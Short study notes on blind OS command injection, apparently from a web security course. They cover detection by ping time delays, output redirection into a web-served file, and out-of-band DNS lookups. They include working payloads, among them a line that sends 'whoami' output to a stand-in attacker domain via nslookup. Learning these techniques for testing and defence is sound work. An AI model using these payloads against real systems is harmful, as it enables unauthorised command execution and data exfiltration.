## Blind Injection
Common Vulns
• Can still be exploited, just need different techniques
• Common Mail Syntax
   ◇ mail -s “note” -aFrom:mine@gmail.com victim@gmail.com 

Detecting commands using time delays
• Know the command was executed using ping
• lets your specify number of ICMP packets to send
• & ping -c 10 127.0.0.1 &
• Try all parameters until one works

Exploit by redirecting output
• If app serves static resources from location /var/www/static use:
   ◇ & whoami > /var/www/static/whoami.txt &
• then you can access that file:
   ◇ https://vulnerable-website.com/whoami.txt
   ◇ If you can't access it, look for instances where files are being displayed on the site already (perhaps pictures).
      ▪ Find the URL used to access those, then inject your file name in there.

Exploiting using OAST technqiues
• & nslookup kgji2ohoyw.web-attacker.com &
   ◇ Monitor attacker site for the lookup occuring
   ◇ Determines that command was successfully injected.
   ◇  email=x||nslookup+x.burpcollaborator.net||
• Once you know it works, perform a whoami command
   ◇ & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
